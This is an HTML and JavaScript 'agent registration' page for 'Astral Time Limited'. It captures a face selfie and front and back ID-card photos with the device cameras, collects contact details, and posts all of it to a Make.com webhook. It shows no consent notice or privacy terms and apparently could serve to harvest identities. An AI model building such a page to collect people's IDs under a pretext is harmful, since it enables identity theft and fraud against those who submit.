<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Agent Registration - Astral Time Limited</title>
<style>
body {
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
  margin: 0;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
}
.container {
  background: white;
  padding: 30px;
  border-radius: 12px;
  box-shadow: 0 8px 16px rgba(0,0,0,0.2);
  width: 90%;
  max-width: 400px;
  display: flex;
  flex-direction: column;
  align-items: center;
}
button, input {
  margin-top: 15px;
  width: 90%;
  padding: 10px;
  border-radius: 5px;
  font-size: 16px;
}
button {
  background: #007bff;
  color: white;
  border: none;
}
button:hover {
  background: #0056b3;
}
.video-container {
  position: relative;
  margin-top: 20px;
}
video {
  width: 360px;
  height: 360px;
  object-fit: cover;
  border-radius: 50%;
  border: 5px dashed #007bff;
  transform: scaleX(-1);
}
canvas { display: none; }
.preview-container {
  margin-top: 20px;
  width: 90%;
  text-align: center;
}
.preview-img {
  width: 100%;
  margin-top: 10px;
  border: 1px solid #ccc;
  border-radius: 8px;
}
p#status {
  margin-top: 20px;
  font-size: 14px;
  color: red;
}
footer {
  margin-top: 30px;
  font-size: 12px;
  color: gray;
  text-align: center;
}
</style>
</head>
<body>
<div class="container">
<h2>Astral Time Limited</h2>
<h3>Agent Registration - Face & ID Verification</h3>

<div class="video-container">
  <video id="video" autoplay playsinline style="display:none;"></video>
</div>

<button onclick="startCamera()" id="startBtn">Start Camera</button>
<canvas id="canvas"></canvas>

<button onclick="captureFace()" id="captureBtn" style="display:none;">Capture Face</button>

<p id="status"></p>

<form id="registerForm" style="display:none;">
  <input type="text" id="fullname" placeholder="Full Name" required>
  <input type="tel" id="phone" placeholder="Phone Number" required>
  <input type="email" id="email" placeholder="Email Address" required>
  <input type="text" id="country" placeholder="Country" required>
  <input type="text" id="entryDate" placeholder="Entry Date (YYYY-MM-DD)" required>

  <div class="preview-container">
    <button type="button" onclick="captureID('front')">Capture ID Front</button>
    <img id="previewFront" class="preview-img" src="" alt="ID Front Preview" style="display:none;">

    <button type="button" onclick="captureID('back')">Capture ID Back</button>
    <img id="previewBack" class="preview-img" src="" alt="ID Back Preview" style="display:none;">
  </div>

  <button type="submit">Submit Registration</button>
</form>

<footer>Copyright © 2025 Astral Time Limited. All rights reserved.</footer>
</div>

<script>
let videoStream = null;
let idFrontImage = '';
let idBackImage = '';
let faceImage = '';

// 打开前置相机
function startCamera() {
  const video = document.getElementById('video');
  const startBtn = document.getElementById('startBtn');
  const captureBtn = document.getElementById('captureBtn');

  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
  }

  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
    video.srcObject = stream;
    video.style.display = 'block';
    captureBtn.style.display = 'inline-block';
    startBtn.style.display = 'none';
    videoStream = stream;
  }).catch(err => {
    alert("Camera access denied.");
  });
}

// 拍自拍
function captureFace() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');
  canvas.width = 380;
  canvas.height = 380;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  faceImage = canvas.toDataURL('image/jpeg').split(',')[1];

  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
    videoStream = null;
  }

  setTimeout(() => {
    openBackCamera();
    document.getElementById('registerForm').style.display = 'flex';
    document.getElementById('status').innerText = "Face captured! Now capture your ID documents.";
  }, 800);
}

// 打开后置相机
function openBackCamera() {
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).then(stream => {
    const video = document.getElementById('video');
    video.srcObject = stream;
    videoStream = stream;
  }).catch(err => {
    alert("Cannot access back camera.");
  });
}

// 拍身份证
function captureID(side) {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');
  canvas.width = 380;
  canvas.height = 380;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  const imageData = canvas.toDataURL('image/jpeg');

  if (side === 'front') {
    idFrontImage = imageData.split(',')[1];
    document.getElementById('previewFront').src = imageData;
    document.getElementById('previewFront').style.display = 'block';
    alert("Captured ID Front successfully!");
  } else if (side === 'back') {
    idBackImage = imageData.split(',')[1];
    document.getElementById('previewBack').src = imageData;
    document.getElementById('previewBack').style.display = 'block';
    alert("Captured ID Back successfully!");
  }
}

// 提交表单，发到Make.com Webhook
document.getElementById('registerForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const fullname = document.getElementById('fullname').value.trim();
  const phone = document.getElementById('phone').value.trim();
  const email = document.getElementById('email').value.trim();
  const country = document.getElementById('country').value.trim();
  const entryDate = document.getElementById('entryDate').value.trim();

  if (!idFrontImage || !idBackImage || !faceImage) {
    alert("Please capture all required photos!");
    return;
  }

  const registrationData = {
    fullname,
    phone,
    email,
    country,
    entryDate,
    faceImage,
    idFrontImage,
    idBackImage
  };

  fetch('https://hook.us2.make.com/b8cblqur1hojn3vq1nzeunwxl4om2a', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(registrationData)
  })
  .then(response => {
    alert("Registration successfully sent!");
  })
  .catch(error => {
    console.error('Error sending registration:', error);
    alert("Failed to send registration.");
  });

});
</script>
</body>
</html>
